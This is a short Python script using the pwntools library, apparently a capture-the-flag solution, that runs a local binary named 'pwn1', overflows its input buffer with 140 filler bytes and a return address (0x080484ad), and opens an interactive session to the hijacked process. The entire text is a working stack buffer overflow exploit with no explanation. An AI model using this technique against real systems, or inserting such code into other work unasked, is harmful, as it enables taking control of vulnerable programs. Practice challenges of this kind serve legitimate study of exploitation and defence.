from pwn import *

with process('./pwn1') as r:
    inp=b'A'*140 + p32(0x080484ad)
    r.sendline(inp)
    r.interactive()